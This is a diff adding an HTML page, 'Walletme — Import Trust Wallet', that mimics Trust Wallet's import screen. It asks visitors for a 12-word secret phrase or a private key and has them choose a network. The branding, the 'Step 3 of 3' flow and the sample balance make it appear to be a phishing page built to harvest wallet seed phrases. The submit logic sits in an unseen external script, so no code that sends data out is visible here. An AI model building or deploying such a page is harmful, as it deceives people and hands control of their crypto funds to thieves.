@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Walletme — Import Trust Wallet</title>
+    <link rel="stylesheet" href="styles.css" />
+  </head>
+  <body class="t7-page">
+    <div class="page-shell t7-shell">
+      <main class="security-layout t7-layout">
+        <aside class="security-sidebar t7-sidebar">
+          <div class="mini-brand">
+            <img src="unnamed.png" class="brand-img" alt="Trust Wallet" />
+            <div class="brand-word small-word">Trust Wallet</div>
+          </div>
+
+          <div class="security-copy t7-copy">
+            <div class="step-label">Step 3 of 3</div>
+            <h2>Import a wallet</h2>
+          </div>
+
+          <p class="t7-subtitle">Locate your Secret Phrase or Trust Wallet</p>
+
+          <div class="t7-tabs" aria-label="Wallet import types">
+            <button class="tab active" type="button">Mobile</button>
+            <button class="tab" type="button">Extension</button>
+          </div>
+
+          <div class="t7-phone-card" aria-hidden="true">
+            <div class="mini-wallet-card">
+              <div class="mini-header">
+                <span class="mini-tag">Main Wallet</span>
+                <span class="mini-close"></span>
+              </div>
+              <div class="mini-balance">$1,000.00 <span>USD</span></div>
+              <div class="mini-sub">$0.00 USD</div>
+              <div class="mini-grid">
+                <span></span><span></span><span></span>
+                <span></span><span></span><span></span>
+                <span></span><span></span><span></span>
+              </div>
+            </div>
+            <div class="t7-phone-bullet"></div>
+          </div>
+
+          <p class="t7-instruction">1. On your Trust Wallet mobile app, click on Wallet</p>
+
+          <div class="t7-footer-nav" aria-label="Helpers">
+            <button class="nav-pill" type="button" aria-label="Back">←</button>
+            <button class="nav-pill" type="button" aria-label="Forward">→</button>
+            <button class="nav-pill" type="button" aria-label="Refresh">↻</button>
+            <a href="#" aria-label="Help">Help</a>
+          </div>
+        </aside>
+
+        <section class="t7-panel">
+          <div class="t7-card">
+            <div class="t7-topbar-row">
+              <a href="t4.html" class="t7-back">&lt; Back</a>
+              <div class="t7-qr-badge"><span>🔑</span> Import with QR Code</div>
+            </div>
+
+            <h3 class="t7-title">Import with Secret Phrase or Private Key</h3>
+
+            <div class="field-group">
+              <label>Wallet Name</label>
+              <div class="input-shell wallet-name-shell">
+                <input type="text" value="Main wallet" aria-label="Wallet Name" />
+                <button class="clear-field" type="button" aria-label="Clear wallet name">×</button>
+              </div>
+              <span class="form-hint">You can edit this later</span>
+            </div>
+
+            <div class="field-group">
+              <label>Enter Secret Phrase or Private Key</label>
+              <div class="secret-card">
+                <div class="phrase-type-tabs">
+                  <button class="phrase-tab active" type="button" data-type="phrase">Secret Phrase</button>
+                  <button class="phrase-tab" type="button" data-type="key">Private Key</button>
+                </div>
+                <div class="secret-card-body">
+                  <div id="phraseGrid" class="phrase-grid">
+                    <div class="phrase-word-wrap"><span class="word-num">1</span><input class="phrase-word" type="password" autocomplete="off" /></div>
+                    <div class="phrase-word-wrap"><span class="word-num">2</span><input class="phrase-word" type="password" autocomplete="off" /></div>
+                    <div class="phrase-word-wrap"><span class="word-num">3</span><input class="phrase-word" type="password" autocomplete="off" /></div>
+                    <div class="phrase-word-wrap"><span class="word-num">4</span><input class="phrase-word" type="password" autocomplete="off" /></div>
+                    <div class="phrase-word-wrap"><span class="word-num">5</span><input class="phrase-word" type="password" autocomplete="off" /></div>
+                    <div class="phrase-word-wrap"><span class="word-num">6</span><input class="phrase-word" type="password" autocomplete="off" /></div>
+                    <div class="phrase-word-wrap"><span class="word-num">7</span><input class="phrase-word" type="password" autocomplete="off" /></div>
+                    <div class="phrase-word-wrap"><span class="word-num">8</span><input class="phrase-word" type="password" autocomplete="off" /></div>
+                    <div class="phrase-word-wrap"><span class="word-num">9</span><input class="phrase-word" type="password" autocomplete="off" /></div>
+                    <div class="phrase-word-wrap"><span class="word-num">10</span><input class="phrase-word" type="password" autocomplete="off" /></div>
+                    <div class="phrase-word-wrap"><span class="word-num">11</span><input class="phrase-word" type="password" autocomplete="off" /></div>
+                    <div class="phrase-word-wrap"><span class="word-num">12</span><input class="phrase-word" type="password" autocomplete="off" /></div>
+                  </div>
+                  <div id="privateKeyField" class="hidden">
+                    <div class="pk-wrap">
+                      <textarea id="secretPhrase" class="secret-textarea" rows="5" placeholder="Enter your private key" autocomplete="off" spellcheck="false"></textarea>
+                      <button class="pk-toggle" id="pkToggle" type="button" aria-label="Toggle private key visibility">👁</button>
+                    </div>
+                  </div>
+                </div>
+                <div class="phrase-actions">
+                  <button class="phrase-action-btn" id="toggleVisibility" type="button">👁 Show</button>
+                  <button class="phrase-action-btn" id="pasteBtn" type="button">📋 Paste</button>
+                </div>
+              </div>
+            </div>
+
+            <div class="field-group">
+              <label>Select Network</label>
+              <div class="select-shell" aria-label="Select Network">
+                <span class="network-icon">⎈</span>
+                <select class="network-select" aria-label="Select Network">
+                  <option value="" selected disabled>Select Network</option>
+                  <option value="ethereum">Ethereum</option>
+                  <option value="binance">BNB Smart Chain</option>
+                  <option value="polygon">Polygon</option>
+                  <option value="avalanche">Avalanche</option>
+                  <option value="solana">Solana</option>
+                </select>
+                <span class="select-arrow">⌄</span>
+              </div>
+            </div>
+
+            <button class="import-btn" type="button">Import</button>
+          </div>
+        </section>
+      </main>
+    </div>
+    <script src="script.js"></script>
+  </body>
+</html>
